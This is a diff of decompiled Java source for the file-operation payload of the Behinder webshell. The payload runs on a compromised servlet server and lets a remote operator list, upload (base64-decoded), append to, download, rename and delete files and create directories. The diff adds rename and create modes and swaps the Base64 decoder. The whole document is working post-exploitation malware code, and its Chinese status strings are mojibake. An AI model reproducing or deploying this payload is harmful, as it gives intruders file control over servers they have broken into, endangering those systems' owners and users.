@@ -1,5 +1,7 @@
 package net.rebeyond.behinder.payload.java;
 
+import sun.misc.BASE64Decoder;
+
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletOutputStream;
@@ -17,11 +19,12 @@ public class FileOperation {
     public static String charset;
     public static String content;
     public static String mode;
+    public static String newPath;
     public static String path;
     private ServletRequest Request;
     private ServletResponse Response;
     private HttpSession Session;
-    private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
+    private final Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
 
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
@@ -42,14 +45,20 @@ public class FileOperation {
             } else if (mode.equalsIgnoreCase("create")) {
                 result.put("msg", create(page));
                 result.put("status", "success");
-            } else if (mode.equalsIgnoreCase("createDir")) {
-                createDir(page);
             } else if (mode.equalsIgnoreCase("append")) {
                 result.put("msg", append(page));
                 result.put("status", "success");
             } else if (mode.equalsIgnoreCase("download")) {
                 download(page);
                 return true;
+            } else if (mode.equalsIgnoreCase("rename")) {
+                result = renameFile(page);
+            } else if (mode.equalsIgnoreCase("createFile")) {
+                result.put("msg", createFile(page));
+                result.put("status", "success");
+            } else if (mode.equalsIgnoreCase("createDirectory")) {
+                result.put("msg", createDirectory(page));
+                result.put("status", "success");
             }
         } catch (Exception e) {
             result.put("msg", e.getMessage());
@@ -68,25 +77,24 @@ public class FileOperation {
     }
 
     private String list(PageContext page) throws Exception {
-        File[] listFiles;
-        String str = "";
         File f = new File(path);
         List<Map<String, String>> objArr = new ArrayList<>();
         if (f.isDirectory()) {
-            for (File temp : f.listFiles()) {
+            File[] listFiles = f.listFiles();
+            for (File temp : listFiles) {
                 Map<String, String> obj = new HashMap<>();
                 obj.put("type", temp.isDirectory() ? "directory" : "file");
                 obj.put("name", temp.getName());
-                obj.put("size", String.valueOf(temp.length()));
+                obj.put("size", temp.length() + "");
                 obj.put("perm", temp.canRead() + "," + temp.canWrite() + "," + temp.canExecute());
-                obj.put("lastModified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(temp.lastModified())));
+                obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(temp.lastModified())));
                 objArr.add(obj);
             }
         } else {
             Map<String, String> obj2 = new HashMap<>();
             obj2.put("type", f.isDirectory() ? "directory" : "file");
             obj2.put("name", new String(f.getName().getBytes(this.osCharset), "GBK"));
-            obj2.put("size", String.valueOf(f.length()));
+            obj2.put("size", f.length() + "");
             obj2.put("lastModified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(f.lastModified())));
             objArr.add(obj2);
         }
@@ -116,16 +124,35 @@ public class FileOperation {
     }
 
     private String create(PageContext page) throws Exception {
-        String str = "";
         FileOutputStream fso = new FileOutputStream(path);
-        fso.write(Base64.getDecoder().decode(content));
+        fso.write(new BASE64Decoder().decodeBuffer(content));
         fso.flush();
         fso.close();
-        return path + "ÉÏ´«Íê³É£¬Ô¶³ÌÎÄ¼ş´óĞ¡:" + new File(path).length();
+        return path + "ä¸Šä¼ å®Œæˆï¼Œè¿œç¨‹æ–‡ä»¶å¤§å°:" + new File(path).length();
     }
 
-    private void createDir(PageContext page) throws Exception {
+    private Map<String, String> renameFile(PageContext page) throws Exception {
+        Map<String, String> result = new HashMap<>();
+        File oldFile = new File(path);
+        File newFile = new File(newPath);
+        if (!oldFile.exists() || (!oldFile.isFile() || !oldFile.renameTo(newFile))) {
+            result.put("status", "fail");
+            result.put("msg", "é‡å‘½åå¤±è´¥:" + newPath);
+        } else {
+            result.put("status", "success");
+            result.put("msg", "é‡å‘½åå®Œæˆ:" + newPath);
+        }
+        return result;
+    }
+
+    private String createFile(PageContext page) throws Exception {
+        new FileOutputStream(path).close();
+        return path + "åˆ›å»ºå®Œæˆ";
+    }
+
+    private String createDirectory(PageContext page) throws Exception {
         new File(path).mkdirs();
+        return path + "åˆ›å»ºå®Œæˆ";
     }
 
     private void download(PageContext page) throws Exception {
@@ -134,23 +161,29 @@ public class FileOperation {
         ServletOutputStream sos = page.getResponse().getOutputStream();
         while (true) {
             int length = fis.read(buffer);
-            if (length <= 0) {
+            if (length > 0) {
+                sos.write(Arrays.copyOfRange(buffer, 0, length));
+            } else {
                 sos.flush();
                 sos.close();
                 fis.close();
                 return;
             }
-            sos.write(Arrays.copyOfRange(buffer, 0, length));
         }
     }
 
+    /* JADX DEBUG: Failed to find minimal casts for resolve overloaded methods, cast all args instead
+     method: ClspMth{java.io.FileOutputStream.<init>(java.lang.String, boolean):void throws java.io.FileNotFoundException}
+     arg types: [java.lang.String, int]
+     candidates:
+      ClspMth{java.io.FileOutputStream.<init>(java.io.File, boolean):void throws java.io.FileNotFoundException}
+      ClspMth{java.io.FileOutputStream.<init>(java.lang.String, boolean):void throws java.io.FileNotFoundException} */
     private String append(PageContext page) throws Exception {
-        String str = "";
         FileOutputStream fso = new FileOutputStream(path, true);
-        fso.write(Base64.getDecoder().decode(content));
+        fso.write(new BASE64Decoder().decodeBuffer(content));
         fso.flush();
         fso.close();
-        return path + "×·¼ÓÍê³É£¬Ô¶³ÌÎÄ¼ş´óĞ¡:" + new File(path).length();
+        return path + "è¿½åŠ å®Œæˆï¼Œè¿œç¨‹æ–‡ä»¶å¤§å°:" + new File(path).length();
     }
 
     private Map<String, String> delete(PageContext page) throws Exception {
@@ -158,13 +191,13 @@ public class FileOperation {
         File f = new File(path);
         if (!f.exists()) {
             result.put("status", "fail");
-            result.put("msg", "ÎÄ¼ş²»´æÔÚ.");
+            result.put("msg", "æ–‡ä»¶ä¸å­˜åœ¨.");
         } else if (f.delete()) {
             result.put("status", "success");
-            result.put("msg", path + " É¾³ı³É¹¦.");
+            result.put("msg", path + " åˆ é™¤æˆåŠŸ.");
         } else {
             result.put("status", "fail");
-            result.put("msg", "ÎÄ¼ş" + path + "´æÔÚ£¬µ«ÊÇÉ¾³ıÊ§°Ü.");
+            result.put("msg", "æ–‡ä»¶" + path + "å­˜åœ¨ï¼Œä½†æ˜¯åˆ é™¤å¤±è´¥.");
         }
         return result;
     }
@@ -172,8 +205,9 @@ public class FileOperation {
     private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
         StringBuilder sb = new StringBuilder();
         sb.append("[");
-        for (Map<String, String> entity : list) {
-            sb.append(buildJson(entity, encode) + ",");
+        Iterator<Map<String, String>> it = list.iterator();
+        while (it.hasNext()) {
+            sb.append(buildJson(it.next(), encode) + ",");
         }
         if (sb.toString().endsWith(",")) {
             sb.setLength(sb.length() - 1);
@@ -194,11 +228,11 @@ public class FileOperation {
                     getClass();
                     Class Base64 = Class.forName("java.util.Base64");
                     Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
-                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes(StandardCharsets.UTF_8)});
+                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
                     getClass();
                     Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder2, new Object[]{value.getBytes(StandardCharsets.UTF_8)})).replace("\n", "").replace("\r", "");
+                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                 }
             }
             sb.append(value);
